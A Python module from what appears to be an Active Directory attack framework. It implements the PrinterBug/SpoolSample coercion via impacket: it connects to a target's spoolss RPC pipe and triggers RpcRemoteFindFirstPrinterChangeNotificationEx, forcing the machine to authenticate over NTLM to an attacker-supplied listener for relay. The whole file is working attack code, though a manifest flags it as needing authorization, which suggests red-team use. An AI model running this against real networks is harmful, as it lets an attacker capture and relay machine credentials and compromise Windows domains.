"""PrinterBug / SpoolSample — coerce via MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.printerbug.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)

    if not listener:
        print("[!] --listener required", file=sys.stderr)
        return 1

    print("[*] PrinterBug: {} → coerce to {}".format(target, listener))

    try:
        from impacket.dcerpc.v5 import transport, rprn
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        string_binding = "ncacn_np:{}[\\pipe\\spoolss]".format(target)
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)

        request = rprn.RpcOpenPrinter()
        request["pPrinterName"] = "\\\\{}\x00".format(target)
        resp = dce.request(request)
        handle = resp["pHandle"]

        request2 = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request2["hPrinter"] = handle
        request2["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
        request2["pszLocalMachine"] = "\\\\{}\\x00".format(listener)
        request2["dwPrinterLocal"] = 0
        request2["pOptions"] = None

        try:
            dce.request(request2)
        except Exception:
            pass

        print("[+] PrinterBug triggered — check relay listener on {}".format(listener))
        dce.disconnect()
        return 0

    except Exception as exc:
        print("[-] PrinterBug error: {}".format(exc), file=sys.stderr)
        return 1
